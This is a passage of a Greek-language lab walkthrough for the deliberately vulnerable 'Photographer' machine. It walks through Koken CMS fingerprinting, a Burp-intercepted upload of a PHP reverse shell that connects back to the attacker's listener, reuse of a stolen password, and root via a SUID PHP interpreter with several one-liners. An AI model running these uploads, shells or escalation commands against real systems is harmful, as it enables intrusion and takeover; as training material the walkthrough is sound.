   291156  2020-07-20 12:11   wordpress/wp-includes/version.php
---------                     -------
 12666609                     1847 files
```
```text
(κανένα wp-config.php στο archive — μόνο το stock sample)
```

**Ένα backup WordPress 12 MB σε ανώνυμο share ΜΟΙΑΖΕΙ με jackpot.**

| Flag | Ρόλος |
| --- | --- |
| **`-l`** | **Λίστα περιεχομένων ΧΩΡΙΣ εξαγωγή** — **γρήγορο, και αποφεύγει να γράψετε 12 MB αρχεία που δεν χρειάζεστε** |
| **`-p FILE`** | **Τυπώνει ΕΝΑ μέλος στο stdout** — ώστε να το **grep-άρετε κατευθείαν** |
| **`2>/dev/null`** | **Απόρριψη του σφάλματος** αν το μέλος δεν υπάρχει |

**Δύο διδάγματα:**

1. **Πάντα επιθεωρείτε τα ΠΕΡΙΕΧΟΜΕΝΑ ενός backup πριν υποθέσετε ότι διαρρέει διαπιστευτήρια.**
2. **Τα ΠΡΑΓΜΑΤΙΚΑ backups ΡΟΥΤΙΝΑ περιέχουν `wp-config.php`, `.env`, `id_rsa` και `*.sql`** —
   **άρα αυτό εξακολουθεί να είναι εύρημα επιπέδου αναφοράς.**

**`wp-config-sample.php` είναι το ΑΡΧΕΙΟ ΔΕΙΓΜΑΤΟΣ** που έρχεται με κάθε WordPress —
**περιέχει `define('DB_PASSWORD', 'password_here')`, δηλαδή ΤΙΠΟΤΑ.**

### 4. Fingerprint της εφαρμογής

```bash
curl -s http://TARGET:8000/ | grep -io 'koken[^"]*\|<title>[^<]*</title>\|href="[^"]*"' | head -20
curl -sI http://TARGET:8000/admin/
```

```text
<title>daisa ahomi</title>
href="/admin/"
href="/storage/originals/"
Koken 0.22.24
```
```text
HTTP/1.1 200 OK
Date: Wed, 12 May 2021 11:14:22 GMT
Server: Apache/2.4.18 (Ubuntu)
X-Powered-By: PHP/7.2.24-0ubuntu0.16.04.2
Set-Cookie: koken_session_ci=a%3A5%3A%7B%7D; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
```

**Έκδοση ΠΡΩΤΑ, έρευνα ΜΕΤΑ.**

**`Koken 0.22.24`** μαζί με **PHP `7.2.24`** σε **Ubuntu 16.04**.

| Στοιχείο | Τι σας λέει |
| --- | --- |
| **`Koken 0.22.24`** | **Το CMS ΚΑΙ η ΑΚΡΙΒΗΣ έκδοση** |
| **`koken_session_ci`** | **Επιβεβαιώνει το framework** (το `_ci` = CodeIgniter, πάνω στο οποίο χτίζεται το Koken) |
| **`storage/originals/`** | **ΠΟΥ ΠΑΝΕ τα uploads — ΘΥΜΗΘΕΙΤΕ αυτή τη διαδρομή** |
| **`PHP/7.2.24-0ubuntu0.16.04.2`** | **Ubuntu 16.04 + η έκδοση PHP** (σημαντική για το SUID αργότερα) |
| **`HttpOnly` στο cookie** | **Καλή πρακτική** — **το JS δεν το διαβάζει** (προστασία από XSS κλοπής session) |

```bash
searchsploit koken
searchsploit -m php/webapps/48706.txt && cat 48706.txt
```

```text
-------------------------------------------------------------------
 Exploit Title                                       |  Path
-------------------------------------------------------------------
Koken CMS 0.22.24 - Arbitrary File Upload            | php/webapps/48706.txt
-------------------------------------------------------------------
```
```text
# Exploit Title: Koken CMS 0.22.24 - Arbitrary File Upload
# Date: 2020-07-20
# Exploit Author: v1n1v131r4
# Vendor Homepage: https://koken.me/
# Software Link: https://github.com/koken/koken
# Version: 0.22.24
# Tested on: Ubuntu 16.04
# CVE: N/A

Description:
Koken CMS allows authenticated administrators to import content. The import
function checks the file extension on the CLIENT side, using JavaScript, but
the server does not validate the extension. An attacker with admin access can
upload a PHP webshell by intercepting the request.

Steps:
1. Log in to /admin/
2. Go to Library → Import content
3. Select a .php.jpg file
4. Intercept with Burp and change filename to .php
5. Access the file at /storage/originals/…
```

**Η ΕΚΔΟΣΗ ΤΑΙΡΙΑΖΕΙ ΑΚΡΙΒΩΣ** — **και αυτό είναι που κάνει το EDB-48706 ΕΦΑΡΜΟΣΙΜΟ, όχι απλώς
παρόμοιο.**

**`-m`** = **mirror** — **αντιγράφει την καταχώριση στον κατάλογο εργασίας σας**. **Διαβάστε την
ΠΡΙΝ ενεργήσετε.**

**Η πρόταση-ΚΛΕΙΔΙ:**

> *«checks the file extension on the **CLIENT** side»*

**Δηλαδή: το JavaScript του φυλλομετρητή απορρίπτει το `.php`, ΑΛΛΑ ο εξυπηρετητής ΟΧΙ.**

**Αυτό σας λέει ότι η διόρθωση ΔΕΝ είναι ένα έξυπνο όνομα αρχείου: είναι να ΣΤΕΙΛΕΤΕ αυτό που ο
φυλλομετρητής αρνήθηκε να στείλει — που σημαίνει ΠΑΡΕΜΒΑΛΛΟΜΕΝΟ PROXY.**

**`CVE: N/A`** — **ΔΕΝ υπάρχει CVE.** **Αυτό είναι συνηθισμένο για μικρά CMS.** **Το EDB είναι
η μόνη τεκμηρίωση.** **Στην αναφορά σας, αναφέρετε το EDB, όχι ένα CVE.**

**Και προσέξτε: ο δημιουργός του exploit (`v1n1v131r4`) είναι Ο ΙΔΙΟΣ με τον δημιουργό του
μηχανήματος.** **Αυτό είναι συχνό σε CTF — ο δημιουργός δημοσιεύει το exploit για το δικό του
κουτί.**

### 5. Σύνδεση με το συνεπαγόμενο διαπιστευτήριο

```text
http://TARGET:8000/admin/  →  email: daisa@photographer.com  ·  password: babygirl
```

```text
Welcome back, Daisa.
```

**Αν το `babygirl` δεν δούλευε, η σωστή κλιμάκωση είναι μια ΘΕΜΑΤΙΚΗ λίστα, όχι μια
ΜΕΓΑΛΥΤΕΡΗ:**

```bash
cewl -d 2 -m 3 -w daisa_words.txt http://TARGET:8000/
printf '%s\n' babygirl Babygirl BABYGIRL 'babygirl;' daisa Daisa daisaahomi \
              'babygirl2020' secret 'mybabygirl' >> daisa_words.txt
sort -u daisa_words.txt -o daisa_words.txt
wc -l daisa_words.txt
```

```text
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```
```text
312 daisa_words.txt
```

**Το `cewl -d 2 -m 3`** θερίζει **λέξεις τριών ή περισσότερων χαρακτήρων από ΔΥΟ άλματα του
site** — **ακριβώς το λεξιλόγιο που θα χρησιμοποιούσε ένας δημιουργός που θεματίζει ένα κουτί
γύρω από μια οικογένεια.**

**Οι προσαρτημένες παραλλαγές είναι οι ΤΥΠΙΚΕΣ μετατροπές** (πεζά/κεφαλαία, σημείωση, έτος,
σύνθετη).

**Το `sort -u … -o FILE`** αφαιρεί διπλότυπα **επι τόπου με ασφάλεια**. **Προσοχή: το
`sort -u FILE > FILE` ΚΑΤΑΣΤΡΕΦΕΙ το αρχείο** — **το κέλυφος το αδειάζει ΠΡΙΝ το `sort` το
διαβάσει.** **Το `-o` γράφει ΜΕΤΑ την ανάγνωση.**

**312 λέξεις** — **έναντι 14.000.000 στο `rockyou.txt`.** **Αυτή είναι η διαφορά ανάμεσα σε
θεματικό και γενικό λεξικό.**

### 6. Upload, παρεμβολή, μετάλλαξη

**Ετοιμάστε το κέλυφος:**

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
sed -i "s/127.0.0.1/ATTACKER/" shell.php
sed -i "s/1234/4444/" shell.php
grep -nE '^\$(ip|port)' shell.php
cp shell.php shell.php.jpg
ls -l shell.php*
```

```text
52:$ip = '192.168.56.10';  // CHANGE THIS
53:$port = 4444;           // CHANGE THIS
```
```text
-rw-r--r-- 1 kali kali 5493 May  4 14:18 shell.php
-rw-r--r-- 1 kali kali 5493 May  4 14:20 shell.php.jpg
```

**Τα ΤΑΥΤΟΣΗΜΑ μεγέθη επιβεβαιώνουν ότι το `shell.php.jpg` είναι ΑΝΤΙΓΡΑΦΟ, όχι κομμένο.**

**Το `grep` ΕΙΝΑΙ το βήμα επαλήθευσης** — **το να ανεβάσετε ένα κέλυφος με ανεπεξέργαστο `$ip`
αποτυγχάνει ΣΙΩΠΗΛΑ και μοιάζει με πρόβλημα δικτύου.**

**Στον πίνακα ελέγχου του Koken:**

```text
Library → Import content
```

**Ενεργοποιήστε την παρεμβολή του Burp, ανεβάστε το `shell.php.jpg`, και μετά στην
παρεμβαλλόμενη αίτηση αλλάξτε το όνομα αρχείου:**

```http
POST /admin/users/import HTTP/1.1
Host: 192.168.56.122:8000
Cookie: koken_session_ci=a%3A5%3A%7B…
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123
Content-Length: 5712

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="files[]"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php
$ip = '192.168.56.10';  // CHANGE THIS
$port = 4444;           // CHANGE THIS
…
```

**→ μεταλλάξτε σε:**

```http
Content-Disposition: form-data; name="files[]"; filename="shell.php"
```

**Προωθήστε το.**

**Ο έλεγχος πλευράς πελάτη ΕΧΕΙ ΗΔΗ ΤΡΕΞΕΙ** — **στον φυλλομετρητή, πριν η αίτηση φύγει από το
μηχάνημά σας** — **άρα ο εξυπηρετητής λαμβάνει ένα όνομα `.php` που ΔΕΝ ΕΠΙΚΥΡΩΣΕ ποτέ.**

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 412

{"id":17,"title":"shell","filename":"shell.php","storage":
{"originals":{"path":"storage/originals/3c/13/shell.php","mime":"application/x-httpd-php",
"filesize":5493}}}
```

```text
http://TARGET:8000/storage/originals/3c/13/shell.php
```

**Διαβάστε την απόκριση JSON ως την επιβεβαίωσή σας:**

| Πεδίο | Τι σας λέει |
| --- | --- |
| **`"filename":"shell.php"`** | **Η ΔΙΚΗ ΤΟΥ καταγραφή του τι αποθήκευσε — η μετάλλαξη ΠΕΤΥΧΕ** |
| **`"storage":{"originals":{"path":…}}`** | **Ο ΚΑΤΑΛΟΓΟΣ ΔΥΟ ΕΠΙΠΕΔΩΝ με κατακερματισμό** (`3c/13/`) που το Koken χρησιμοποιεί |
| **`"mime":"application/x-httpd-php"`** | **Ο εξυπηρετητής ΤΟ ΑΝΑΓΝΩΡΙΣΕ ΩΣ PHP** — **άρα θα το ΕΚΤΕΛΕΣΕΙ** |
| **`"filesize":5493`** | **Ταυτόσημο με το τοπικό** — **καμία περικοπή** |

**Αν η απόκριση δεν σας δώσει τη διαδρομή, βρείτε την:**

```bash
gobuster dir -u http://TARGET:8000/storage/originals/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 50 -q 2>/dev/null | head
```

**`-t 50`** = **50 νήματα** · **`-q`** = **αθόρυβο, μόνο τα ευρήματα**.

**Το `3c/13/` προέρχεται από το MD5 του ονόματος αρχείου** — **τα δύο πρώτα ζεύγη hex γίνονται
κατάλογοι**. **Έτσι το Koken αποφεύγει έναν κατάλογο με 100.000 αρχεία.**

### 7. Πυροδότηση, και ανάγνωση του μπάνερ του κελύφους

```bash
nc -lvnp 4444                                  # Kali, πρώτα
curl -s http://TARGET:8000/storage/originals/3c/13/shell.php
```

```text
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.122.
Ncat: Connection from 192.168.56.122:48112.
Linux photographer 4.4.0-178-generic #208-Ubuntu SMP Sun Apr 5 23:45:10 UTC 2020 x86_64 GNU/Linux
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Γιατί η ΑΠΛΗ ΕΠΙΣΚΕΨΗ στο URL ΕΚΤΕΛΕΣΕ PHP:**

**Η χαρτογράφηση handler του Apache λέει «τρέξε τα `*.php` μέσω του διερμηνέα PHP»**, **και το
`storage/originals/` είναι ΜΕΣΑ στο document root χωρίς override που να το απενεργοποιεί.**

**Upload + εκτέλεση επί τόπου = τα δύο μισά κάθε RCE μέσω file-upload.**

**Διαβάστε το μπάνερ γραμμή προς γραμμή:**

| Τμήμα | Τι σημαίνει |
| --- | --- |
| **`4.4.0-178-generic`** | **Ubuntu 16.04, 64-bit** |
| **`#208-Ubuntu SMP Sun Apr 5 23:45:10 UTC 2020`** | **Kernel από Απρίλιο 2020 — ΣΧΕΤΙΚΑ ενημερωμένο** |
| **→ συμπέρασμα** | **Τα kernel exploits είναι ΑΠΙΘΑΝΑ· περιμένετε αναβάθμιση μέσω ΡΥΘΜΙΣΗΣ** |
| **`sh: 0: can't access tty; job control turned off`** | **ΦΥΣΙΟΛΟΓΙΚΟ για ένα σκέτο reverse shell** — **όχι σφάλμα** |

**Αναβάθμιση:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; stty rows 40 cols 160
```

### 8. Η σημαία χρήστη είναι ΠΡΑΓΜΑΤΙΚΟ όριο

```bash
ls -la /home/daisa/
cat /home/daisa/user.txt
```

```text
total 32
drwxr-xr-x 3 daisa daisa 4096 Jul 21 03:44 .
drwxr-xr-x 4 root  root  4096 Jul 21 03:29 ..
-rw-r--r-- 1 daisa daisa  220 Jul 21 03:29 .bash_logout
-rw-r--r-- 1 daisa daisa 3771 Jul 21 03:29 .bashrc
-rw------- 1 daisa daisa   38 Jul 21 03:44 user.txt
cat: /home/daisa/user.txt: Permission denied
```

**`-rw-------` ιδιοκτησίας `daisa`** — **το `www-data` ΔΕΝ ΜΠΟΡΕΙ να το διαβάσει.**

**Αυτό ΔΕΝ είναι διακόσμηση· είναι το κουτί να σας λέει να αναβαθμίσετε.**

**Δύο δρόμοι:**

| Δρόμος | Πώς |
| --- | --- |
| **Α — επανάχρηση κωδικού** | **`su daisa`** με **`babygirl`** — **η επανάχρηση διαπιστευτηρίων CMS→σύστημα είναι η ΠΙΟ ΣΥΧΝΗ πλαγινή κίνηση σε πραγματικές αναθέσεις** |
| **Β — κατευθείαν root** | **Παραλείψτε τη σημαία χρήστη, διαβάστε την από το root** |

```bash
su daisa
cat /home/daisa/user.txt
```

```text
Password: babygirl
daisa@photographer:~$ cat user.txt
d41d8cd98f00b204e9800998ecf8427e
```

**Ο δρόμος Α είναι Ο ΣΩΣΤΟΣ** — **γιατί σας δίνει και έναν λογαριασμό με TTY**, **που κάνει το
`su`/`sudo` αξιόπιστο.**

### 9. Η λίστα ελέγχου — και γιατί δείχνει προς SUID

```bash
sudo -l
cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.*
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

```text
sudo: command not found
```
```text
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```
```text
/bin/su
/bin/mount
/bin/umount
/bin/ping
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/php7.2
```

**`sudo: command not found`** — **όπως στο Μηχάνημα 8.** **Άρα καμία αναβάθμιση μέσω sudo.**

**Το cron είναι ΟΛΟ stock.**

**Και στη λίστα SUID, το ΤΕΛΕΥΤΑΙΟ στοιχείο είναι το εύρημα:** **`/usr/bin/php7.2`**.

| Binary | Stock SUID; |
| --- | --- |
| `su`, `mount`, `umount`, `ping` | **Ναι** |
| `passwd`, `chsh`, `gpasswd`, `newgrp`, `sudo` | **Ναι** |
| `ssh-keysign`, `dmcrypt-get-device`, `polkit-agent-helper-1` | **Ναι** |
| **`/usr/bin/php7.2`** | **ΟΧΙ** ← **το εύρημα** |

**Κανένα σύστημα δεν δίνει SUID σε ΔΙΕΡΜΗΝΕΑ ΓΛΩΣΣΑΣ.** **Αυτό είναι 100% σκόπιμο.**

**`getcap -r /`** — **δείτε το Μηχάνημα 8.** **Εδώ δεν βρίσκει τίποτα χρήσιμο, αλλά ΕΙΝΑΙ στη
λίστα ελέγχου.**

### 10. SUID σε διερμηνέα PHP

```bash
ls -l /usr/bin/php7.2
/usr/bin/php7.2 -v
```

```text
-rwsr-xr-x 1 root root 4043728 Feb  7  2020 /usr/bin/php7.2
```
```text
PHP 7.2.24-0ubuntu0.16.04.2 (cli) (built: Oct 28 2019 12:07:00) ( NTS )
Copyright (c) 1997-2018 The PHP Group
Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
    with Zend OPcache v7.2.24-0ubuntu0.16.04.2, Copyright (c) 1999-2018, by Zend Technologies
```

**`-rwsr-xr-x root root`** — **SUID root.** **Και η έκδοση ΤΑΙΡΙΑΖΕΙ με το `X-Powered-By` του
βήματος 4.**

```bash
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh',['-p']);"
```

```text
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# cat /root/proof.txt
```

| Τμήμα | Ρόλος |
| --- | --- |
| **`-r "CODE"`** | **Εκτέλεσε αυτόν τον κώδικα PHP** — **χωρίς αρχείο** |
| **`pcntl_exec('/bin/sh', ['-p'])`** | **ΑΝΤΙΚΑΤΑΣΤΗΣΕ την τρέχουσα διεργασία** με `/bin/sh` (**`execve`**) — **άρα το νέο κέλυφος ΚΛΗΡΟΝΟΜΕΙ το `euid=0`** |
| **`['-p']`** | **Όρισμα στο `sh`: preserve privileges** — **χωρίς αυτό, το `sh` ΡΙΧΝΕΙ το euid στο uid** |

**Γιατί `pcntl_exec` αντί για `system`:**

**Το `system()` κάνει FORK** — **το παιδί κληρονομεί το euid, αλλά ορισμένα συστήματα ρίχνουν τα
προνόμια στο fork.** **Το `pcntl_exec` κάνει EXEC στην ΙΔΙΑ διεργασία** — **πιο αξιόπιστο.**

**Εναλλακτικές αν το `pcntl` δεν είναι μεταγλωττισμένο μέσα:**

```bash
/usr/bin/php7.2 -r "system('/bin/sh -p');"
/usr/bin/php7.2 -r "exec('/bin/sh -p');"
/usr/bin/php7.2 -r "popen('/bin/sh -p','r');"
/usr/bin/php7.2 -r "passthru('/bin/sh -p');"
```

**Ελέγξτε αν το `pcntl` είναι διαθέσιμο:**

```bash
/usr/bin/php7.2 -m | grep -i pcntl
```

```text
pcntl
```

**Αν δεν τυπώσει τίποτα, χρησιμοποιήστε `system()`.**

**`uid=33(www-data) … euid=0(root)`** — **Διαβάστε το ως *SUID αναβάθμιση, όχι σύνδεση*:**
**το πραγματικό UID παραμένει 33, το ΕΝΕΡΓΟ γίνεται 0, και οι έλεγχοι δικαιωμάτων χρησιμοποιούν
το ενεργό.**

```text
# cat /root/proof.txt
d5e8b3b7c9a1f4e2d6c8b0a3f5e7d9c1
```

**Σημαία root.** **Και `whoami` θα τυπώσει `www-data`** — **γι' αυτό το `id` είναι η απόδειξη,
όχι το `whoami`.**

### 11. Σύγκριση: τρία μηχανήματα, τρεις διαδρομές από το SMB

| Μηχάνημα | Εύρημα SMB | Οδήγησε σε |
| --- | --- | --- |
| **8 — Empire: Breakout** | **`IPC$` ανοιχτό** → RID cycling | **Όνομα χρήστη** (`cyber`) |
| **11 — Photographer** | **`sambashare` READ ONLY** → αρχεία | **Διαπιστευτήριο** (`babygirl`) |
| **12 — Symfonos: 1** | **ανώνυμο share** → `attention.txt` | **Λίστα απαγορευμένων κωδικών** |

**Το δίδαγμα: το SMB δίνει ΤΡΙΑ διαφορετικά πράγματα, και πρέπει να ξέρετε ποιο ψάχνετε:**

1. **Ονόματα** (μέσω RID cycling — χρειάζεται `IPC$`)
2. **Αρχεία** (μέσω READ — χρειάζεται read permission)
3. **Εγγραφή** (μέσω WRITE — χρειάζεται write permission, **το jackpot**)

**Πάντα ελέγξτε και τα τρία.**

---

_Πίσω στη [Μαθησιακή Διαδρομή 1](../README.md) · προηγούμενο: [Μηχάνημα 10 — PwnLab: init](<10-pwnlab-init.md>) · επόμενο: [Μηχάνημα 12 — Symfonos: 1](<12-symfonos-1.md>) · πλήρες walkthrough: [`labs/3-055-photographer-1`](../../labs/3-055-photographer-1/README.md)_
